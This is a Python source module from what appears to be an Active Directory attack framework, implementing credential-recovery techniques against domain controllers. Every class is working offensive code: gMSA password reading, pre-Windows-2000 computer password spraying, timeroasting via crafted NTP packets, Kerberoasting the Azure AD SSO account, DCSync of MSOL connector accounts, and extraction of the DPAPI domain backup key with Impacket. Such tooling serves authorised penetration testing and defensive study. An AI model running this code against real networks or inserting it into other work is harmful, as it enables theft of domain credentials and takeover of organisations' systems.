"""Read-only credential recovery: gMSA, pre2k, timeroast, DPAPI, hybrid."""

from __future__ import annotations

import contextlib
import socket
import struct
from typing import Any

from ldap3 import SUBTREE
from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.capabilities.dcsync import Dcsync
from adaf_attack.capabilities.gmsa_laps_enum import _parse_managed_password_blob
from adaf_attack.capabilities.kerberoast import Kerberoast
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.ldap_ops import attr_value, finish, lookup_sam, try_ntlm_bind
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_from_catalog("gmsa-read")
class GmsaRead:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        sam = kwargs.get("sam") or kwargs.get("gmsa")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            accounts: list[dict[str, Any]] = []
            if sam:
                found = lookup_sam(
                    conn,
                    base_dn,
                    str(sam),
                    ["sAMAccountName", "distinguishedName", "msDS-ManagedPassword"],
                )
                entries = [found[1]] if found else []
            else:
                conn.search(
                    base_dn,
                    "(objectClass=msDS-GroupManagedServiceAccount)",
                    search_scope=SUBTREE,
                    attributes=["sAMAccountName", "distinguishedName", "msDS-ManagedPassword"],
                )
                entries = list(conn.entries)
            for entry in entries:
                name = str(attr_value(entry, "sAMAccountName") or "")
                item: dict[str, Any] = {
                    "sam": name,
                    "dn": str(attr_value(entry, "distinguishedName") or ""),
                }
                raw = attr_value(entry, "msDS-ManagedPassword")
                if raw is None:
                    item["managed_password_present"] = False
                else:
                    blob = (
                        raw.encode("latin-1", errors="replace")
                        if isinstance(raw, str)
                        else bytes(raw)
                    )
                    item["managed_password_present"] = True
                    parsed = _parse_managed_password_blob(blob)
                    if include_secrets and parsed:
                        item["managed_password"] = parsed
                    elif parsed:
                        item["parsed"] = True
                    if parsed and parsed.get("current_password"):
                        graph.add_edge(
                            f"GMSA@{name.upper()}@{target.domain.upper()}",
                            f"GMSA@{name.upper()}@{target.domain.upper()}",
                            "ReadGMSAPassword",
                        )
                accounts.append(item)
            result = {
                "ok": True,
                "count": len(accounts),
                "gmsas": accounts,
                "include_secrets": include_secrets,
            }
            return finish(session, graph, "gmsa-read", result, count=len(accounts))
        finally:
            conn.unbind()


@register_from_catalog("pre2k-spray")
class Pre2kSpray:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        **kwargs: Any,
    ) -> dict[str, Any]:
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            conn.search(
                base_dn,
                "(objectClass=computer)",
                search_scope=SUBTREE,
                attributes=["sAMAccountName"],
                size_limit=int(kwargs.get("max_objects") or 500),
            )
            attempts: list[dict[str, Any]] = []
            hits: list[dict[str, Any]] = []
            limit = int(kwargs.get("max_attempts") or 0)
            computers = [str(attr_value(e, "sAMAccountName") or "") for e in conn.entries]
            computers = [c for c in computers if c]
            if limit:
                computers = computers[:limit]
            for sam in computers:
                candidates = [sam.rstrip("$").lower(), sam.rstrip("$"), sam.lower()]
                hit = False
                note = "miss"
                for password in dict.fromkeys(candidates):
                    ok, note = try_ntlm_bind(target, sam, password)
                    if ok:
                        hit = True
                        hits.append({"sam": sam, "password_scheme": "samaccountname"})
                        graph.add_edge(
                            f"COMPUTER@{sam.upper()}@{target.domain.upper()}",
                            f"COMPUTER@{sam.upper()}@{target.domain.upper()}",
                            "Pre2kPassword",
                        )
                        console.print(f"  [green]HIT[/green] {sam}")
                        break
                attempts.append({"sam": sam, "ok": hit, "note": note})
            result = {
                "ok": True,
                "attempt_count": len(attempts),
                "hit_count": len(hits),
                "hits": hits,
                "attempts": attempts,
            }
            return finish(session, graph, "pre2k-spray", result, hits=len(hits))
        finally:
            conn.unbind()


def build_timeroast_request(rid: int) -> bytes:
    packet = bytearray(48)
    packet[0] = 0x1B
    struct.pack_into("<I", packet, 40, rid)
    return bytes(packet)


def parse_timeroast_response(data: bytes, rid: int) -> str | None:
    if len(data) < 68:
        return None
    digest = data[52:68].hex()
    salt = data[:48].hex()
    return f"$sntp-ms${digest}${salt}"


def _udp_query(host: str, payload: bytes, timeout: float = 2.0) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.settimeout(timeout)
        sock.sendto(payload, (host, 123))
        data, _addr = sock.recvfrom(128)
        return data
    finally:
        sock.close()


@register_from_catalog("timeroast")
class Timeroast:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        start = int(kwargs.get("rid_start") or 1000)
        end = int(kwargs.get("rid_end") or start + int(kwargs.get("count") or 32))
        hashes: list[dict[str, Any]] = []
        for rid in range(start, end + 1):
            request = build_timeroast_request(rid)
            try:
                response = _udp_query(target.dc_ip, request)
            except OSError as exc:
                hashes.append({"rid": rid, "error": str(exc)})
                continue
            line = parse_timeroast_response(response, rid)
            if line:
                item: dict[str, Any] = {"rid": rid, "format": "sntp-ms"}
                if include_secrets:
                    item["hash"] = line
                hashes.append(item)
                graph.add_node(f"RID@{rid}@{target.domain.upper()}", "Computer", rid=rid)
        result = {
            "ok": True,
            "count": len(hashes),
            "hashes": hashes,
            "rid_start": start,
            "rid_end": end,
        }
        return finish(session, graph, "timeroast", result, count=len(hashes))


@register_from_catalog("azureadssoacc-roast")
class AzureAdSsoAccRoast:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        sam = str(kwargs.get("sam") or "AZUREADSSOACC$")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            found = lookup_sam(conn, base_dn, sam, ["sAMAccountName", "servicePrincipalName"])
            if not found:
                result = {"ok": False, "sam": sam, "error": "account not found"}
                return finish(session, graph, "azureadssoacc-roast", result, ok=False)
            roasted = Kerberoast().run(
                target, session, graph, include_secrets=include_secrets, force=force, sam=sam
            )
            tickets = [
                t
                for t in roasted.get("tickets") or []
                if str(t.get("account", "")).rstrip("$").upper() == sam.rstrip("$").upper()
            ]
            result = {"ok": True, "sam": sam, "tickets": tickets or roasted.get("tickets") or []}
            return finish(session, graph, "azureadssoacc-roast", result, ok=True)
        finally:
            conn.unbind()


@register_from_catalog("aadconnect-dcsync")
class AadConnectDcsync:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            conn.search(
                base_dn,
                "(&(objectClass=user)(sAMAccountName=MSOL_*))",
                search_scope=SUBTREE,
                attributes=["sAMAccountName", "distinguishedName"],
            )
            principals = [
                str(attr_value(e, "sAMAccountName") or "")
                for e in conn.entries
                if attr_value(e, "sAMAccountName")
            ]
            result: dict[str, Any] = {"ok": True, "principals": principals, "dcsync": None}
            sam = kwargs.get("sam") or (principals[0] if principals else None)
            if sam:
                result["dcsync"] = Dcsync().run(
                    target, session, graph, include_secrets=include_secrets, force=force, sam=sam
                )
            else:
                result["ok"] = False
                result["error"] = "no MSOL_* connector account found"
            return finish(session, graph, "aadconnect-dcsync", result, count=len(principals))
        finally:
            conn.unbind()


@register_from_catalog("dpapi-domain-backup")
class DpapiDomainBackup:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("dpapi-domain-backup")
        if not target.has_credentials:
            raise RuntimeError("dpapi-domain-backup requires credentials with replication rights")
        from impacket.examples.secretsdump import RemoteOperations
        from impacket.smbconnection import SMBConnection

        smb = SMBConnection(target.dc_ip, target.dc_ip)
        lm, nt = target.lm_nt_hashes()
        if target.use_kerberos or target.ccache:
            smb.kerberosLogin(
                target.username or "",
                target.password or "",
                target.domain,
                lm,
                nt,
                aesKey=target.aes_key or "",
                kdcHost=target.dc_ip,
                useCache=True,
            )
        elif target.hashes:
            smb.login(target.username or "", "", target.domain, lm, nt)
        else:
            smb.login(target.username or "", target.password or "", target.domain)
        remote = RemoteOperations(smb, doKerberos=target.use_kerberos, kdcHost=target.dc_ip)
        backup_key = None
        error = None
        try:
            getter = getattr(remote, "getDPAPI_DOMAIN_BACKUP_KEY", None) or getattr(
                remote, "getDPAPIEncryptedHek", None
            )
            if getter:
                backup_key = getter()
            else:
                error = (
                    "RemoteOperations has no DPAPI domain backup-key helper in this Impacket build"
                )
        except Exception as exc:  # noqa: BLE001
            error = str(exc)
        finally:
            with contextlib.suppress(Exception):
                remote.finish()
        payload: dict[str, Any] = {"ok": backup_key is not None, "error": error}
        if include_secrets and backup_key is not None:
            payload["backup_key"] = (
                backup_key.hex() if isinstance(backup_key, bytes) else str(backup_key)
            )
        elif backup_key is not None:
            payload["backup_key_present"] = True
        return finish(session, graph, "dpapi-domain-backup", payload, ok=payload["ok"])
